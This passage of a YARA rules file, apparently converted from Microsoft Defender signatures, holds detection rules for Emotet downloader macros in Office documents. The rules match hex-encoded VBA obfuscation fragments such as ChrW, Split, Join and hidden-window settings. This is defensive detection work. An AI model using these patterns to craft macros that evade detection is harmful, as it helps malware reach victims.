        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {2b 20 43 68 72 57 28 77 64 4b 65 79 53 29 20 2b 20 [0-32] 2e [0-32] 2e 54 61 67}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 53 70 6c 69 74 28 [0-32] 20 2b 20 4c 54 72 69 6d 28 4c 54 72 69 6d 28 [0-16] 29 29 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_UB_2147749475_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.UB!MTB"
        threat_id = "2147749475"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {2b 20 43 68 72 57 28 77 64 4b 65 79 53 29 20 2b 20 [0-32] 2e [0-32] 2e 54 61 67}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 53 70 6c 69 74 28 [0-32] 20 2b 20 4c 54 72 69 6d 28 [0-6] 29 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_UC_2147749484_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.UC!MTB"
        threat_id = "2147749484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-32] 2e 20 5f 02 00 43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {45 6e 64 20 53 65 6c 65 63 74 [0-32] 2e 20 5f 02 00 73 68 6f 77 77 69 6e 64 6f 77 20 3d 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_3 = ".Tag +" ascii //weight: 1
        $x_1_4 = {2b 20 4a 6f 69 6e 28 [0-32] 2c 20 22 22 29 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_UD_2147749485_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.UD!MTB"
        threat_id = "2147749485"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {2b 20 43 68 72 57 28 77 64 4b 65 79 53 29 20 2b 20 [0-48] 77 [0-48] 69 [0-48] 6e [0-48] 33 [0-48] 32}  //weight: 1, accuracy: Low
        $x_1_4 = {2b 20 4a 6f 69 6e 28 [0-32] 2c 20 22 22 29 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_UE_2147749486_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.UE!MTB"
        threat_id = "2147749486"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 75 6e 63 74 69 6f 6e 20 [0-32] 28 29 [0-8] 49 66}  //weight: 1, accuracy: Low
        $x_1_2 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 47 72 6f 75 70 4e 61 6d 65 [0-32] 20 3d 20 53 70 6c 69 74 28 [0-32] 20 2b 20 54 72 69 6d 28 [0-16] 29 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_UF_2147749495_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.UF!MTB"
        threat_id = "2147749495"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {2b 20 43 68 72 57 28 77 64 4b 65 79 53 29 20 2b 20 22 [0-48] 77 [0-48] 69 [0-48] 6e [0-48] 33 [0-48] 32 [0-48] 5f [0-48] 22}  //weight: 1, accuracy: Low
        $x_1_4 = "ChrW(wdKeyP)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_UG_2147749497_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.UG!MTB"
        threat_id = "2147749497"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 75 6e 63 74 69 6f 6e 20 [0-32] 28 29 [0-8] 49 66}  //weight: 1, accuracy: Low
        $x_1_2 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 47 72 6f 75 70 4e 61 6d 65 [0-32] 20 3d 20 53 70 6c 69 74 28 [0-32] 20 2b 20 43 56 61 72 28 54 72 69 6d 28 [0-16] 29 29 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_UH_2147749498_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.UH!MTB"
        threat_id = "2147749498"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 54 61 67 [0-32] 20 3d 20 [0-32] 20 2b 20 43 68 72 57 28 77 64 4b 65 79 53 29 20 2b 20 [0-32] 2e [0-32] 2e 54 61 67 20 2b}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 4a 6f 69 6e 28 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_UI_2147749499_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.UI!MTB"
        threat_id = "2147749499"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {45 6e 64 20 49 66 [0-32] 2e 20 5f 02 00 73 68 6f 77 77 69 6e 64 6f 77 20 3d 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 4a 6f 69 6e 28 [0-32] 2c 20 22 22 29 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_UJ_2147749501_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.UJ!MTB"
        threat_id = "2147749501"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 47 72 6f 75 70 4e 61 6d 65 [0-32] 20 3d 20 53 70 6c 69 74 28 [0-32] 20 2b 20 43 56 61 72 28 54 72 69 6d 28 [0-16] 29 29 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {46 75 6e 63 74 69 6f 6e 20 [0-32] 28 29 [0-8] 46 6f 72}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_UL_2147749508_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.UL!MTB"
        threat_id = "2147749508"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 47 72 6f 75 70 4e 61 6d 65 [0-32] 20 3d 20 53 70 6c 69 74 28 [0-32] 20 2b 20 [0-8] 28 54 72 69 6d 28 [0-16] 29 29 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {46 75 6e 63 74 69 6f 6e 20 [0-32] 28 29 [0-8] 52 65 44 69 6d}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_UM_2147749518_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.UM!MTB"
        threat_id = "2147749518"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {2b 20 43 68 72 57 28 77 64 4b 65 79 53 29 20 2b 20 22 [0-48] 77 [0-53] 69 [0-48] 6e [0-48] 33 [0-48] 32 [0-48] 5f [0-48] 22 20 2b}  //weight: 1, accuracy: Low
        $x_1_4 = {4a 6f 69 6e 28 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_UN_2147749522_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.UN!MTB"
        threat_id = "2147749522"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {73 68 6f 77 77 69 6e 64 6f 77 20 3d 20 46 61 6c 73 65 [0-8] 52 65 44 69 6d}  //weight: 1, accuracy: Low
        $x_1_4 = {4a 6f 69 6e 28 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = {4c 6f 6f 70 [0-6] 52 65 44 69 6d}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_UO_2147749524_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.UO!MTB"
        threat_id = "2147749524"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {2b 20 43 68 72 57 28 49 20 2b 20 77 64 4b 65 79 53 29 20 2b 20 22 [0-48] 77 [0-48] 69 [0-48] 6e [0-48] 33 [0-48] 32 [0-48] 5f [0-48] 22 20 2b}  //weight: 1, accuracy: Low
        $x_1_4 = "= ChrW(I + wdKeyP)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_UP_2147749533_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.UP!MTB"
        threat_id = "2147749533"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 47 72 6f 75 70 4e 61 6d 65 [0-32] 20 3d 20 53 70 6c 69 74 28 [0-32] 20 2b 20 [0-8] 28 54 72 69 6d 28 [0-16] 29 29 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {4a 6f 69 6e 28 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = "showwindow = False" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_UQ_2147749539_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.UQ!MTB"
        threat_id = "2147749539"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 54 61 67 [0-32] 20 3d 20 [0-32] 20 2b 20 43 68 72 57 28 [0-21] 20 2b 20 77 64 4b 65 79 53 29 20 2b 20 [0-32] 2e [0-32] 2e 54 61 67 20 2b}  //weight: 1, accuracy: Low
        $x_1_4 = {46 75 6e 63 74 69 6f 6e 20 [0-37] 28 29 [0-32] 57 68 69 6c 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_UR_2147749540_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.UR!MTB"
        threat_id = "2147749540"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {4e 65 78 74 [0-32] 2e 20 5f 02 00 73 68 6f 77 77 69 6e 64 6f 77 20 3d 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_4 = "= ChrW(LK + wdKeyP + PO)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_US_2147749542_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.US!MTB"
        threat_id = "2147749542"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {2b 20 43 68 72 57 28 [0-2] 20 2b 20 77 64 4b 65 79 53 29 20 2b 20 22 [0-48] 77 [0-48] 69 [0-48] 6e [0-48] 33 [0-48] 32 [0-48] 5f [0-48] 22 20 2b}  //weight: 1, accuracy: Low
        $x_1_4 = {4a 6f 69 6e 28 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_TQ_2147749562_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.TQ!MTB"
        threat_id = "2147749562"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {4c 6f 6f 70 [0-48] 2e 20 5f 02 00 73 68 6f 77 77 69 6e 64 6f 77 20 3d 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_4 = "= ChrW(ijs + wdKeyP + dwf)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_UT_2147749563_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.UT!MTB"
        threat_id = "2147749563"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 [0-32] 20 3d 20 53 70 6c 69 74 28 [0-32] 20 2b 20 53 74 72 52 65 76 65 72 73 65 28 [0-16] 29 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {4a 6f 69 6e 28 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_UU_2147749566_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.UU!MTB"
        threat_id = "2147749566"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {2b 20 43 68 72 57 28 [0-18] 20 2b 20 77 64 4b 65 79 53 20 2b 20 [0-18] 29 20 2b 20 22 [0-64] 77 [0-48] 69 [0-48] 6e [0-48] 33 [0-48] 32 [0-80] 22 20 2b}  //weight: 1, accuracy: Low
        $x_1_4 = {4a 6f 69 6e 28 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_UV_2147749577_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.UV!MTB"
        threat_id = "2147749577"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = "= ChrW(owdsd + wdKeyP + kwm" ascii //weight: 1
        $x_1_4 = "SHoWwiNDow! = False" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_UW_2147749603_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.UW!MTB"
        threat_id = "2147749603"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 53 70 6c 69 74 28 22 [0-96] 77 [0-96] 22 20 2b 20 6d 61 75 75 77 75 77 75 20 2b 20 63 6b 6c 6f 77 2c 20 69 64 73 66 65 65 65 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 53 70 6c 69 74 28 22 [0-96] 77 [0-112] 22 20 2b 20 63 73 20 2b 20 63 76 2c 20 65 77 61 29}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 53 70 6c 69 74 28 22 [0-96] 77 [0-112] 22 20 2b 20 64 73 66 65 20 2b 20 76 64 73 2c 20 77 65 66 66 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_UX_2147749604_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.UX!MTB"
        threat_id = "2147749604"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 [0-32] 20 3d 20 53 70 6c 69 74 28 [0-32] 20 2b 20 43 56 61 72 28 53 74 72 52 65 76 65 72 73 65 28 [0-16] 29 29 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {4a 6f 69 6e 28 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_UY_2147749615_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.UY!MTB"
        threat_id = "2147749615"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 54 61 67 [0-32] 20 3d 20 [0-32] 20 2b 20 43 68 72 57 28 [0-21] 20 2b 20 77 64 4b 65 79 53 29 20 2b 20 [0-32] 2e [0-32] 2e 54 61 67 20 2b}  //weight: 1, accuracy: Low
        $x_1_4 = {4a 6f 69 6e 28 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VA_2147749619_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VA!MTB"
        threat_id = "2147749619"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
